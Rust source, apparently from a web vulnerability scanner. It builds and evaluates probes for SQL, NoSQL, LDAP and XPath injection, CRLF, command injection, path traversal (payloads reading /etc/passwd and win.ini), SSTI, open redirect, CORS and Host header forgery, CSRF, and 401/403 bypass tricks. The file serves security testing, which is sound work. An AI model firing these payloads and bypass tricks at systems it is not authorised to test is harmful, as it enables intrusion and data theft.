pub fn probes_with(raw: &str, checks: &[String], marker: &str, limit: usize, id_segments: &[usize]) -> Vec<Probe> {
    let want = |c: &str| checks.is_empty() || checks.iter().any(|x| x == c);
    let mut out = Vec::new();
    for pt in points_with(raw, id_segments).into_iter().chain(name_points(raw)) {
        let mut add = |check: &'static str, payload: String| {
            if out.len() < limit
                && let Some(r) = inject(raw, &pt, &payload)
            {
                out.push(Probe { check, point: pt.clone(), payload, raw: r });
            }
        };
        // Names get a quote and a reflection probe only.
        if pt.kind == PointKind::Name {
            if want("sql_error") {
                add("sql_error", format!("{}'", pt.original));
            }
            if want("reflected_input") {
                add("reflected_input", format!("{marker}\"'<>"));
            }
            continue;
        }
        if want("sql_error") {
            // Quotes break SQL and XPath; `*)(` breaks LDAP filters. The
            // error tells which (SQL, NoSQL, LDAP, XPath): see [`injection_error`].
            for s in ["'", "\"", "')", "\\", "*)(", "']"] {
                add("sql_error", format!("{}{s}", pt.original));
            }
        }
        if want("crlf") && matches!(pt.kind, PointKind::Query | PointKind::Form | PointKind::Path | PointKind::Cookie) {
            add("crlf", format!("{}\r\nX-PM-Injected: {marker}", pt.original));
            add("crlf", format!("{}%0d%0aX-PM-Injected:%20{marker}", pt.original));
        }
        if want("cmd_injection") && pt.kind != PointKind::Path {
            for p in cmd_output_payloads(&pt.original, marker) {
                add("cmd_injection", p);
            }
        }
        // Headers and cookies get the injection checks only.
        if matches!(pt.kind, PointKind::Header | PointKind::Cookie) {
            continue;
        }
        if want("reflected_input") && pt.kind != PointKind::Path {
            add("reflected_input", format!("{marker}\"'<>"));
        }
        if want("open_redirect") && redirect_like(&pt.name) {
            add("open_redirect", REDIRECT_TARGET.into());
            add("open_redirect", "//pm-redirect.example/".into());
        }
        if want("path_traversal") && pt.kind != PointKind::Path && file_like(&pt) {
            for t in [
                "../../../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
            ] {
                add("path_traversal", t.into());
            }
        }
        if want("ssti") && pt.kind != PointKind::Path {
            for (_, t) in SSTI {
                add("ssti", (*t).into());
            }
        }
    }
    out
}

pub fn snippet(text: &str, at: usize, n: usize) -> String {
    let mut start = at.saturating_sub(20);
    while !text.is_char_boundary(start) {
        start -= 1;
    }
    let s: String = text[start..].chars().take(n).collect();
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Whether a probe's response shows the issue its check looks for.
pub fn analyze(probe: &Probe, base: &Seen, got: &Seen, marker: &str) -> Option<ActiveIssue> {
    let issue = |title, severity, evidence: String, prove_with: Option<String>| ActiveIssue {
        check: probe.check,
        title,
        severity,
        point: format!("{:?} {}", probe.point.kind, probe.point.name).to_lowercase(),
        payload: probe.payload.clone(),
        evidence,
        prove_with,
    };
    match probe.check {
        "sql_error" => {
            let (family, what, at) = injection_error(&got.body)?;
            if injection_error(&base.body).is_some_and(|b| b.0 == family) {
                return None;
            }
            let (check, title, prove_with) = match family {
                "sql" => (
                    "sql_error",
                    "Database error caused by a quote (likely SQL injection)",
                    Some("proof_run oracle timing with a delay payload in this parameter".to_string()),
                ),
                "nosql" => ("nosql_error", "NoSQL query error caused by the input (likely NoSQL injection)", None),
                "ldap" => ("ldap_error", "LDAP filter error caused by the input (likely LDAP injection)", None),
                _ => ("xpath_error", "XPath error caused by the input (likely XPath injection)", None),
            };
            let mut i = issue(title, "high", format!("{what}: {}", snippet(&got.body, at, 140)), prove_with);
            i.check = check;
            Some(i)
        }
        "crlf" => {
            let v = got.header("x-pm-injected")?;
            v.contains(marker).then(|| {
                issue(
                    "HTTP response header injection (CRLF): a header was added",
                    "high",
                    format!("X-PM-Injected: {v}"),
                    None,
                )
            })
        }
        "host_header" => {
            let host = format!("{marker}.example").to_ascii_lowercase();
            let in_loc = got.location.as_deref().is_some_and(|l| l.to_ascii_lowercase().contains(&host));
            let at = got.body.to_ascii_lowercase().find(&host);
            if base.body.to_ascii_lowercase().contains(&host) || (!in_loc && at.is_none()) {
                return None;
            }
            let evidence = match (in_loc, at) {
                (true, _) => format!("Location: {}", got.location.clone().unwrap_or_default()),
                (_, Some(at)) => snippet(&got.body, at, 100),
                _ => String::new(),
            };
            Some(issue(
                if in_loc {
                    "Host header injection: redirects go to the host the client names"
                } else {
                    "Host header injection: the page builds links from the host the client names"
                },
                "medium",
                format!("{} → {evidence}", probe.payload),
                None,
            ))
        }
        "cors" => {
            let origin = probe.payload.strip_prefix("Origin: ")?;
            let acao = got.header("access-control-allow-origin")?;
            if acao != origin {
                return None;
            }
            let creds = got.header("access-control-allow-credentials").is_some_and(|v| v.eq_ignore_ascii_case("true"));
            let (title, severity) = match (origin == "null", creds) {
                (false, true) => ("CORS: any origin may read responses with the user's cookies", "high"),
                (true, true) => ("CORS: the null origin (sandboxed pages) may read with cookies", "medium"),
                _ => ("CORS: any origin may read responses (without cookies)", "low"),
            };
            Some(issue(
                title,
                severity,
                format!(
                    "{} → Access-Control-Allow-Origin: {acao}{}",
                    probe.payload,
                    if creds { ", credentials: true" } else { "" }
                ),
                None,
            ))
        }
        "reflected_input" => {
            let at = got.body.find(marker)?;
            let html = got.content_type.as_deref().is_some_and(|c| c.contains("html"));
            let raw = got.body[at..].starts_with(&format!("{marker}\"'<>"))
                || got.body[at..].starts_with(&format!("{marker}\"'<"));
            if !html || !raw {
                return None;
            }
            let value = match probe.point.kind {
                PointKind::Query | PointKind::Form => "{{xss_url}}",
                _ => "{{xss}}",
            };
            Some(issue(
                "Input reflected unencoded in HTML (possible XSS)",
                "medium",
                snippet(&got.body, at, 80),
                Some(format!("proof_run oracle reflection with {value} in parameter {}", probe.point.name)),
            ))
        }
        "open_redirect" => {
            let loc = got.location.as_deref()?.to_ascii_lowercase();
            let redirect = got.status.is_some_and(|s| (300..400).contains(&s));
            let ours = loc.starts_with("https://pm-redirect.example") || loc.starts_with("//pm-redirect.example");
            (redirect && ours).then(|| issue("Open redirect", "medium", format!("Location: {loc}"), None))
        }
        "path_traversal" => {
            let hit = ["root:x:0:0", "[fonts]", "for 16-bit app support"]
                .iter()
                .find_map(|n| got.body.find(n).map(|at| (n, at)));
            let (needle, at) = hit?;
            if base.body.contains(needle) {
                return None;
            }
            Some(issue("Path traversal: a system file came back", "high", snippet(&got.body, at, 100), None))
        }
        "ssti" => {
            let at = got.body.find("1337")?;
            if base.body.contains("1337") || got.body.contains(&probe.payload) {
                return None;
            }
            let engines = SSTI.iter().find(|(_, p)| *p == probe.payload).map_or("unknown", |(e, _)| e);
            Some(issue(
                "Template expression evaluated (server-side template injection)",
                "high",
                format!("{} (syntax of: {engines})", snippet(&got.body, at, 80)),
                None,
            ))
        }
        "cmd_injection" => {
            let want = format!("{marker}1337");
            let at = got.body.find(&want)?;
            if base.body.contains(&want) {
                return None;
            }
            Some(issue(
                "OS command injection: the shell ran an echo",
                "high",
                snippet(&got.body, at, 80),
                Some("proof_run oracle timing with ;sleep N in this parameter".into()),
            ))
        }
        _ => None,
    }
}

/// NoSQL, LDAP and XPath error signatures (SQL ones come from the passive scanner).
const INJECTION_ERRORS: &[(&str, &str, &str)] = &[
    ("mongoerror", "nosql", "MongoDB error"),
    ("mongoservererror", "nosql", "MongoDB error"),
    ("mongo.errors", "nosql", "MongoDB error"),
    ("bsontypeerror", "nosql", "BSON error"),
    ("cast to objectid failed", "nosql", "Mongoose cast error"),
    ("unknown operator: $", "nosql", "MongoDB operator error"),
    ("$where", "nosql", "MongoDB $where error"),
    ("couchdb", "nosql", "CouchDB error"),
    ("javax.naming.directory", "ldap", "Java LDAP error"),
    ("com.sun.jndi.ldap", "ldap", "Java LDAP error"),
    ("ldapexception", "ldap", "LDAP error"),
    ("ldap_search", "ldap", "PHP LDAP error"),
    ("bad search filter", "ldap", "LDAP filter error"),
    ("invalid dn syntax", "ldap", "LDAP DN error"),
    ("xpathexception", "xpath", "XPath error"),
    ("xpathevalerror", "xpath", "XPath error (lxml)"),
    ("simplexmlelement::xpath", "xpath", "PHP XPath error"),
    ("xmlxpatheval", "xpath", "libxml XPath error"),
    ("org.apache.xpath", "xpath", "Java XPath error"),
    ("ms.internal.xml.xpath", "xpath", ".NET XPath error"),
    ("expression must evaluate to a node-set", "xpath", ".NET XPath error"),
    ("invalid predicate", "xpath", "XPath error"),
];

/// The injection error in a response: family (`sql`, `nosql`, `ldap`,
/// `xpath`), what it is, and where it starts.
pub fn injection_error(text: &str) -> Option<(&'static str, &'static str, usize)> {
    if let Some((what, true, at)) = crate::error_signature(text) {
        return Some(("sql", what, at));
    }
    let lower = text.to_ascii_lowercase();
    INJECTION_ERRORS.iter().find_map(|(needle, family, what)| lower.find(needle).map(|at| (*family, *what, at)))
}

/// `raw` with header `name` set to `value` (replaced, or added at the end of the head).
pub fn set_header(raw: &str, name: &str, value: &str) -> Option<Vec<u8>> {
    let p = parse(raw)?;
    let clean: String = value.chars().filter(|c| *c != '\r' && *c != '\n').collect();
    let lower = name.to_ascii_lowercase();
    let mut found = false;
    let mut rest = replace_head_line(p.rest_of_head, |k, _| {
        (k == lower).then(|| {
            found = true;
            clean.clone()
        })
    });
    if !found {
        if !rest.is_empty() {
            rest.push_str("\r\n");
        }
        rest.push_str(&format!("{name}: {clean}"));
    }
    Some(rebuild(&Parsed { rest_of_head: &rest, ..p }, p.target, p.body))
}

fn host_of(raw: &str) -> Option<String> {
    let p = parse(raw)?;
    p.rest_of_head.lines().find_map(|l| {
        l.split_once(':').filter(|(k, _)| k.trim().eq_ignore_ascii_case("host")).map(|(_, v)| v.trim().to_string())
    })
}

/// Probes on the request as a whole: Host header injection and CORS origins.
pub fn request_probes(raw: &str, checks: &[String], marker: &str) -> Vec<Probe> {
    let want = |c: &str| checks.is_empty() || checks.iter().any(|x| x == c);
    let mut out = Vec::new();
    // Forged Host values go with a cache buster, so a cache can't serve them to others.
    let busted = crate::advanced::with_cache_buster(raw, &crate::advanced::buster_for(marker, 99))
        .map(|r| String::from_utf8_lossy(&r).into_owned());
    let mut add = |check: &'static str, point: &str, header: &str, value: String| {
        let base = if check == "host_header" { busted.as_deref().unwrap_or(raw) } else { raw };
        if let Some(r) = set_header(base, header, &value) {
            out.push(Probe { check, point: Point::request(point), payload: format!("{header}: {value}"), raw: r });
        }
    };
    let evil = format!("{marker}.example");
    if want("host_header") {
        add("host_header", "Host header", "Host", evil.clone());
        add("host_header", "X-Forwarded-Host header", "X-Forwarded-Host", evil.clone());
    }
    if want("cors") {
        let host = host_of(raw).unwrap_or_default();
        let host = host.split(':').next().unwrap_or_default();
        add("cors", "Origin header", "Origin", format!("https://{evil}"));
        add("cors", "Origin header", "Origin", "null".into());
        if !host.is_empty() {
            // Suffix and prefix tricks against sloppy allow-lists.
            add("cors", "Origin header", "Origin", format!("https://{host}.{evil}"));
            add("cors", "Origin header", "Origin", format!("https://{marker}{host}"));
        }
    }
    out
}

/// NoSQL operator injection for a value: `name[$ne]=v` in query and form
/// data, `{"$ne": v}` in JSON. `value` is a JSON value.
pub fn inject_operator(raw: &str, point: &Point, op: &str, value: &serde_json::Value) -> Option<Vec<u8>> {
    let p = parse(raw)?;
    let (path, query) = p.target.split_once('?').unwrap_or((p.target, ""));
    let flat = |ps: &mut Vec<(String, String)>, i: usize| -> Option<()> {
        let (k, _) = ps.get(i)?.clone();
        let mut new: Vec<(String, String)> = match value {
            serde_json::Value::Array(xs) => {
                xs.iter().map(|x| (format!("{k}[{op}][]"), percent_encode(x.as_str().unwrap_or_default()))).collect()
            }
            v => vec![(format!("{k}[{op}]"), percent_encode(v.as_str().unwrap_or(&v.to_string())))],
        };
        ps.splice(i..=i, new.drain(..));
        Some(())
    };
    match (&point.kind, &point.locator) {
        (PointKind::Query, Locator::Pair(i)) => {
            let mut ps = pairs(query);
            flat(&mut ps, *i)?;
            Some(rebuild(&p, &format!("{path}?{}", join(&ps)), p.body))
        }
        (PointKind::Form, Locator::Pair(i)) => {
            let mut ps = pairs(p.body.trim());
            flat(&mut ps, *i)?;
            Some(rebuild(&p, p.target, &join(&ps)))
        }
        (PointKind::Json, Locator::Pointer(ptr)) => {
            let mut v: serde_json::Value = serde_json::from_str(p.body).ok()?;
            *v.pointer_mut(ptr)? = serde_json::json!({ op: value });
            Some(rebuild(&p, p.target, &v.to_string()))
        }
        _ => None,
    }
}

/// Requests for the NoSQL operator check: a plain random value, `$eq`
/// and `$ne` of it, and a confirming pair (`$regex` matching anything / nothing).
pub struct NoSqlProbes {
    pub plain: Vec<u8>,
    pub eq: Vec<u8>,
    pub ne: Vec<u8>,
    pub all: Vec<u8>,
    pub none: Vec<u8>,
}

pub fn nosql_probes(raw: &str, point: &Point, marker: &str) -> Option<NoSqlProbes> {
    if !matches!(point.kind, PointKind::Query | PointKind::Form | PointKind::Json) {
        return None;
    }
    let r = serde_json::Value::String(format!("{marker}zz"));
    Some(NoSqlProbes {
        plain: inject(raw, point, &format!("{marker}zz"))?,
        eq: inject_operator(raw, point, "$eq", &r)?,
        ne: inject_operator(raw, point, "$ne", &r)?,
        all: inject_operator(raw, point, "$regex", &serde_json::json!(".*"))?,
        none: inject_operator(raw, point, "$regex", &serde_json::json!(format!("^{marker}zz$")))?,
    })
}

/// Operators are interpreted when `$eq r` answers like the plain value
/// `r` and `$ne r` answers differently (and isn't an error).
pub fn nosql_differs(plain: &Seen, eq: &Seen, ne: &Seen) -> bool {
    let ok = |s: &Seen| s.status.is_some_and(|c| c < 500);
    ok(ne)
        && plain.status == eq.status
        && similarity(&plain.body, &eq.body) >= 0.98
        && (ne.status != plain.status || similarity(&ne.body, &plain.body) < 0.9)
}

/// Path and header tricks that sometimes get past a 401/403, each with a
/// control: the same trick on a path that doesn't exist (if that works
/// too, the trick only reaches a catch-all page).
pub fn auth_bypass_variants(raw: &str, marker: &str) -> Vec<(String, Vec<u8>, Vec<u8>)> {
    let Some(p) = parse(raw) else { return Vec::new() };
    let (path, query) = p.target.split_once('?').map_or((p.target, String::new()), |(a, q)| (a, format!("?{q}")));
    if path.len() < 2 || !path.starts_with('/') {
        return Vec::new();
    }
    let fake = format!("/pm{marker}");
    type Trick = (&'static str, fn(&str) -> String);
    let path_tricks: [Trick; 8] = [
        ("trailing slash", |p| format!("{p}/")),
        ("trailing /.", |p| format!("{p}/.")),
        ("leading /%2e", |p| format!("/%2e{p}")),
        ("double slash", |p| format!("/{p}")),
        ("..;/ (Tomcat)", |p| format!("{p}..;/")),
        ("; suffix", |p| format!("{p};.css")),
        ("%20 suffix", |p| format!("{p}%20")),
        ("upper case", |p| p.to_ascii_uppercase()),
    ];
    let mut out = Vec::new();
    for (name, f) in path_tricks {
        let (t, c) = (f(path), f(&fake));
        if t == path {
            continue;
        }
        let tr = rebuild(&p, &format!("{t}{query}"), p.body);
        let cr = rebuild(&p, &format!("{c}{query}"), p.body);
        out.push((format!("path: {name} ({t})"), tr, cr));
    }
    let raw_str = raw.to_string();
    for (h, v) in [("X-Original-URL", path), ("X-Rewrite-URL", path)] {
        // Ask for / and name the real path in the header.
        let root = rebuild(&p, "/", p.body);
        let root = String::from_utf8_lossy(&root).into_owned();
        if let (Some(t), Some(c)) = (set_header(&root, h, v), set_header(&root, h, &fake)) {
            out.push((format!("header: {h}: {v}"), t, c));
        }
    }
    for h in ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Client-IP"] {
        let fake_req = String::from_utf8_lossy(&rebuild(&p, &format!("{fake}{query}"), p.body)).into_owned();
        if let (Some(t), Some(c)) = (set_header(&raw_str, h, "127.0.0.1"), set_header(&fake_req, h, "127.0.0.1")) {
            out.push((format!("header: {h}: 127.0.0.1"), t, c));
        }
    }
    out
}

/// A bypass: the trick gets a 2xx unlike the denied baseline, and the same
/// trick on a missing path doesn't get the same page.
pub fn bypassed(base: &Seen, got: &Seen, control: &Seen) -> bool {
    let ok = got.status.is_some_and(|s| (200..300).contains(&s));
    let unlike_base = similarity(&base.body, &got.body) < 0.9;
    let catch_all = control.status == got.status && similarity(&control.body, &got.body) >= 0.9;
    ok && unlike_base && !got.body.trim().is_empty() && !catch_all
}

/// Common parameter names apps accept without showing them (param mining).
pub const HIDDEN_PARAMS: &[&str] = &[
    "debug",
    "test",
    "admin",
    "is_admin",
    "isAdmin",
    "role",
    "roles",
    "user",
    "user_id",
    "userid",
    "uid",
    "id",
    "account",
    "email",
    "token",
    "access_token",
    "api_key",
    "apikey",
    "key",
    "secret",
    "password",
    "pass",
    "mode",
    "env",
    "dev",
    "verbose",
    "trace",
    "preview",
    "draft",
    "internal",
    "callback",
    "jsonp",
    "format",
    "lang",
    "locale",
    "redirect",
    "next",
    "url",
    "file",
    "path",
    "template",
    "view",
    "page",
    "limit",
    "offset",
    "sort",
    "order",
    "fields",
    "include",
    "expand",
    "filter",
    "q",
    "search",
    "query",
    "cmd",
    "exec",
    "action",
    "do",
    "type",
    "source",
    "ref",
    "show",
    "hidden",
    "all",
    "raw",
    "export",
];

/// `raw` with extra query parameters (or form fields / JSON keys, where the
/// body is that kind) named `names`, valued `<marker><index>`.
pub fn with_params(raw: &str, names: &[&str], marker: &str) -> Option<Vec<u8>> {
    let p = parse(raw)?;
    let existing: Vec<String> = points(raw).into_iter().map(|pt| pt.name.to_ascii_lowercase()).collect();
    let fresh: Vec<(usize, &str)> = names
        .iter()
        .enumerate()
        .filter(|(_, n)| !existing.contains(&n.to_ascii_lowercase()))
        .map(|(i, n)| (i, *n))
        .collect();
    if fresh.is_empty() {
        return None;
    }
    let val = |i: usize| format!("{marker}{i}");
    if p.json
        && let Ok(serde_json::Value::Object(mut o)) = serde_json::from_str::<serde_json::Value>(p.body)
    {
        for (i, n) in &fresh {
            o.insert((*n).to_string(), serde_json::Value::String(val(*i)));
        }
        return Some(rebuild(&p, p.target, &serde_json::Value::Object(o).to_string()));
    }
    let extra = fresh.iter().map(|(i, n)| format!("{n}={}", val(*i))).collect::<Vec<_>>().join("&");
    if p.form {
        let body = if p.body.trim().is_empty() { extra } else { format!("{}&{extra}", p.body.trim()) };
        return Some(rebuild(&p, p.target, &body));
    }
    let sep = if p.target.contains('?') { "&" } else { "?" };
    Some(rebuild(&p, &format!("{}{sep}{extra}", p.target), p.body))
}

/// Names whose values (`<marker><index>`) come back in the response.
pub fn reflected_params<'a>(names: &[&'a str], marker: &str, got: &Seen) -> Vec<&'a str> {
    names
        .iter()
        .enumerate()
        .filter(|(i, _)| {
            let v = format!("{marker}{i}");
            // `<marker>1` is a prefix of `<marker>10`: require a non-digit after it.
            got.body
                .match_indices(&v)
                .any(|(at, _)| !got.body[at + v.len()..].starts_with(|c: char| c.is_ascii_digit()))
        })
        .map(|(_, n)| *n)
        .collect()
}

/// Whether a response differs from the baseline more than the page varies by itself.
pub fn differs(base: &Seen, base2: &Seen, got: &Seen) -> bool {
    let noise = 1.0 - similarity(&base.body, &base2.body);
    base.status == base2.status
        && noise <= 0.2
        && (got.status != base.status || similarity(&base.body, &got.body) < 1.0 - noise - 0.05)
}

/// JavaScript run before the page's own scripts: wraps the dangerous DOM
/// sinks and reports `{"sink", "value"}` through `window[binding]` when a
/// value holding `marker` reaches one.
pub fn dom_hooks(marker: &str, binding: &str) -> String {
    let m = serde_json::to_string(marker).unwrap_or_default();
    let b = serde_json::to_string(binding).unwrap_or_default();
    format!(
        r#"(() => {{
  const M = {m}, B = {b};
  const report = (sink, v) => {{
    try {{
      const s = String(v);
      if (s.includes(M) && typeof window[B] === 'function') window[B](JSON.stringify({{ sink, value: s.slice(0, 300) }}));
    }} catch (e) {{}}
  }};
  const setter = (proto, prop, sink) => {{
    try {{
      const d = Object.getOwnPropertyDescriptor(proto, prop);
      if (!d || !d.set) return;
      Object.defineProperty(proto, prop, {{
        ...d,
        set(v) {{ report(sink, v); return d.set.call(this, v); }},
      }});
    }} catch (e) {{}}
  }};
  const wrap = (obj, name, sink, pick) => {{
    try {{
      const f = obj[name];
      if (typeof f !== 'function') return;
      obj[name] = function (...a) {{ report(sink, pick(a)); return f.apply(this, a); }};
    }} catch (e) {{}}
  }};
  setter(Element.prototype, 'innerHTML', 'innerHTML');
  setter(Element.prototype, 'outerHTML', 'outerHTML');
  setter(HTMLIFrameElement.prototype, 'srcdoc', 'iframe.srcdoc');
  setter(HTMLScriptElement.prototype, 'src', 'script.src');
  setter(HTMLScriptElement.prototype, 'text', 'script.text');
  setter(HTMLAnchorElement.prototype, 'href', 'a.href');
  setter(HTMLFormElement.prototype, 'action', 'form.action');
  wrap(Element.prototype, 'insertAdjacentHTML', 'insertAdjacentHTML', a => a[1]);
  wrap(Element.prototype, 'setAttribute', 'setAttribute', a => /^(on|href$|src$|action$|srcdoc$)/i.test(String(a[0])) ? a[1] : '');
  wrap(document, 'write', 'document.write', a => a.join(''));
  wrap(document, 'writeln', 'document.writeln', a => a.join(''));
  wrap(Range.prototype, 'createContextualFragment', 'createContextualFragment', a => a[0]);
  wrap(window, 'eval', 'eval', a => a[0]);
  wrap(window, 'setTimeout', 'setTimeout', a => typeof a[0] === 'string' ? a[0] : '');
  wrap(window, 'setInterval', 'setInterval', a => typeof a[0] === 'string' ? a[0] : '');
  wrap(window, 'open', 'window.open', a => a[0]);
  wrap(Location.prototype, 'assign', 'location.assign', a => a[0]);
  wrap(Location.prototype, 'replace', 'location.replace', a => a[0]);
  try {{
    const F = window.Function;
    window.Function = function (...a) {{ report('Function', a.join(',')); return F.apply(this, a); }};
  }} catch (e) {{}}
}})();"#
    )
}

/// The `(sink, value)` pairs reported by [`dom_hooks`] that mention `marker`.
pub fn dom_reports(calls: &[String], marker: &str) -> Vec<(String, String)> {
    calls
        .iter()
        .filter_map(|c| serde_json::from_str::<serde_json::Value>(c).ok())
        .filter_map(|v| Some((v["sink"].as_str()?.to_string(), v["value"].as_str()?.to_string())))
        .filter(|(_, v)| v.contains(marker))
        .collect()
}

/// Whether a value reaching `sink` is exploitable: markup that survived
/// into an HTML sink, any value in a code sink, or a `javascript:` URL.
pub fn dom_dangerous(sink: &str, value: &str, marker: &str) -> bool {
    let html = ["innerHTML", "outerHTML", "iframe.srcdoc", "insertAdjacentHTML", "createContextualFragment"]
        .contains(&sink)
        || sink.starts_with("document.write");
    let code = ["eval", "setTimeout", "setInterval", "Function", "script.text"].contains(&sink);
    let nav =
        ["a.href", "form.action", "window.open", "location.assign", "location.replace", "script.src", "setAttribute"]
            .contains(&sink);
    if html {
        return value.contains(&format!("{marker}<pmx"));
    }
    if code {
        return true;
    }
    nav && (value.trim_start().to_ascii_lowercase().starts_with("javascript:") || sink == "script.src")
}

/// Same-origin `<script src>` URLs in a page (at most 8), absolute.
pub fn script_srcs(html: &str, page_url: &str) -> Vec<String> {
    let Ok(base) = url::Url::parse(page_url) else { return Vec::new() };
    let lower = html.to_ascii_lowercase();
    let mut out: Vec<String> = Vec::new();
    let mut from = 0;
    while let Some(at) = lower[from..].find("<script") {
        let start = from + at;
        let end = lower[start..].find('>').map_or(lower.len(), |e| start + e);
        let tag = &html[start..end];
        from = end;
        let tl = tag.to_ascii_lowercase();
        let Some(i) = tl.find("src=") else { continue };
        let v = &tag[i + 4..];
        let src = match v.chars().next() {
            Some(q @ ('"' | '\'')) => v[1..].split(q).next().unwrap_or(""),
            _ => v.split(|c: char| c.is_whitespace() || c == '>').next().unwrap_or(""),
        };
        let Ok(u) = base.join(src.trim()) else { continue };
        if u.origin() == base.origin() && !out.contains(&u.to_string()) {
            out.push(u.to_string());
        }
        if out.len() >= 8 {
            break;
        }
    }
    out
}

/// A GET for `target` (origin-form) with the headers of `raw` (cookies,
/// Host), minus the body and its headers: to fetch a page script or a page
/// that may show stored input.
pub fn get_request(raw: &str, target: &str) -> Option<Vec<u8>> {
    let p = parse(raw)?;
    let rest: Vec<&str> = p
        .rest_of_head
        .lines()
        .map(|l| l.trim_end_matches('\r'))
        .filter(|l| {
            let k = l.split(':').next().unwrap_or("").trim().to_ascii_lowercase();
            !["content-type", "content-length", "transfer-encoding"].contains(&k.as_str())
        })
        .collect();
    let rest = rest.join("\r\n");
    Some(rebuild(&Parsed { method: "GET", rest_of_head: &rest, ..p }, target, ""))
}

/// The value stored by the `i`-th stored XSS probe: a unique tag-like
/// string plus quotes, to see how the page shows it later.
pub fn stored_payload(marker: &str, i: usize) -> String {
    format!("{marker}s{i}<pmx>\"'")
}

/// How a page shows the `i`-th stored value: `Some(true)` unencoded
/// markup, `Some(false)` present but encoded, `None` absent.
pub fn stored_seen(body: &str, marker: &str, i: usize) -> Option<bool> {
    let id = format!("{marker}s{i}");
    let hits: Vec<usize> = body
        .match_indices(&id)
        .map(|(at, _)| at)
        .filter(|at| !body[at + id.len()..].starts_with(|c: char| c.is_ascii_digit()))
        .collect();
    if hits.is_empty() {
        return None;
    }
    Some(hits.iter().any(|at| body[at + id.len()..].starts_with("<pmx>")))
}

fn csrf_token_like(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    ["csrf", "xsrf", "token", "nonce", "authenticity", "__requestverification"].iter().any(|t| n.contains(t))
}

/// Cross-site versions of a state-changing request that relies on cookies:
/// the same request from a foreign Origin and Referer, and for JSON also as
/// `text/plain` (which a plain HTML form can send). Empty when the request
/// isn't a candidate (safe method, no cookie, bearer auth, or a token-like
/// parameter or header present).
pub fn csrf_variants(raw: &str, marker: &str) -> Vec<(String, Vec<u8>)> {
    let Some(p) = parse(raw) else { return Vec::new() };
    if !["POST", "PUT", "PATCH", "DELETE"].contains(&p.method.to_ascii_uppercase().as_str()) {
        return Vec::new();
    }
    let header_names: Vec<String> =
        p.rest_of_head.lines().filter_map(|l| l.split_once(':').map(|(k, _)| k.trim().to_ascii_lowercase())).collect();
    let has = |h: &str| header_names.iter().any(|n| n == h);
    if !has("cookie") || has("authorization") || header_names.iter().any(|n| csrf_token_like(n)) {
        return Vec::new();
    }
    if points(raw).iter().any(|pt| pt.kind != PointKind::Cookie && csrf_token_like(&pt.name)) {
        return Vec::new();
    }
    let evil = format!("https://{marker}.example");
    let mut out = Vec::new();
    let cross = set_header(raw, "Origin", &evil)
        .and_then(|r| set_header(&String::from_utf8_lossy(&r), "Referer", &format!("{evil}/")));
    if let Some(r) = cross {
        if p.json
            && let Some(t) = set_header(&String::from_utf8_lossy(&r), "Content-Type", "text/plain")
        {
            out.push((format!("Origin: {evil}, Content-Type: text/plain"), t));
        }
        out.push((format!("Origin: {evil}"), r));
    }
    out
}

/// `raw` without the header `name` (any case).
pub fn without_header(raw: &str, name: &str) -> Option<Vec<u8>> {
    let p = parse(raw)?;
    let rest: Vec<&str> = p
        .rest_of_head
        .lines()
        .map(|l| l.trim_end_matches('\r'))
        .filter(|l| !l.split(':').next().unwrap_or("").trim().eq_ignore_ascii_case(name))
        .collect();
    let rest = rest.join("\r\n");
    Some(rebuild(&Parsed { rest_of_head: &rest, ..p }, p.target, p.body))
}

/// Whether the cross-site request was accepted like the original one.
pub fn csrf_accepted(base: &Seen, got: &Seen) -> bool {
    base.status.is_some_and(|s| (200..400).contains(&s))
        && got.status == base.status
        && similarity(&base.body, &got.body) >= 0.8
}

#[cfg(test)]
mod tests {
    use super::*;

    const GET: &str = "GET /api/items/42?q=shoe&next=/home&file=report.pdf HTTP/1.1\r\nHost: x\r\n\r\n";

    #[test]
    fn finds_points_and_injects() {
        let pts = points(GET);
        let names: Vec<&str> = pts.iter().map(|p| p.name.as_str()).collect();
        assert_eq!(names, vec!["q", "next", "file", "path segment 3"]);
        let raw = inject(GET, &pts[0], "a b'").unwrap();
        assert!(
            String::from_utf8(raw)
                .unwrap()
                .starts_with("GET /api/items/42?q=a%20b%27&next=/home&file=report.pdf HTTP/1.1\r\nHost: x\r\n\r\n")
        );
        let raw = inject(GET, &pts[3], "43").unwrap();
        assert!(String::from_utf8(raw).unwrap().starts_with("GET /api/items/43?q=shoe"));

        let form =
            "POST /login HTTP/1.1\r\nHost: x\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=al&pw=x";
        let pts = points(form);
        assert_eq!(
            pts.iter().map(|p| (p.kind, p.name.as_str())).collect::<Vec<_>>(),
            vec![(PointKind::Form, "user"), (PointKind::Form, "pw")]
        );
        let raw = String::from_utf8(inject(form, &pts[0], "'").unwrap()).unwrap();
        assert!(raw.ends_with("\r\n\r\nuser=%27&pw=x"), "{raw}");

        let json =
            "POST /api HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"a\":{\"b\":\"x\"},\"n\":5,\"t\":true}";
        let pts = points(json);
        assert_eq!(pts.iter().map(|p| p.name.as_str()).collect::<Vec<_>>(), vec!["b", "n"]);
        let raw = String::from_utf8(inject(json, &pts[0], "'").unwrap()).unwrap();
        assert!(raw.ends_with("{\"a\":{\"b\":\"'\"},\"n\":5,\"t\":true}"), "{raw}");
    }

    #[test]
    fn word_identifiers_in_paths_when_known() {
        let raw = "GET /users/v1/name1 HTTP/1.1\r\nHost: x\r\n\r\n";
        assert!(points(raw).is_empty(), "words aren't guessed");
        let pts = points_with(raw, &[3]);
        assert_eq!((pts.len(), pts[0].original.as_str()), (1, "name1"));
        let sql = probes_with(raw, &["sql_error".into()], "m", 10, &[3]);
        assert!(String::from_utf8_lossy(&sql[0].raw).starts_with("GET /users/v1/name1%27 HTTP/1.1"));
    }

    #[test]
    fn probes_fit_the_parameter() {
        let ps = probes(GET, &[], "pmX", 1000);
        let for_point = |n: &str, c: &str| ps.iter().filter(|p| p.point.name == n && p.check == c).count();
        assert_eq!(for_point("next", "open_redirect"), 2);
        assert_eq!(for_point("q", "open_redirect"), 0);
        assert_eq!(for_point("file", "path_traversal"), 3);
        assert_eq!(for_point("q", "path_traversal"), 0);
        assert_eq!(for_point("path segment 3", "reflected_input"), 0);
        assert_eq!(probes(GET, &["ssti".into()], "pmX", 1000).len(), 3 * SSTI.len());
        assert_eq!(probes(GET, &[], "pmX", 5).len(), 5);
    }

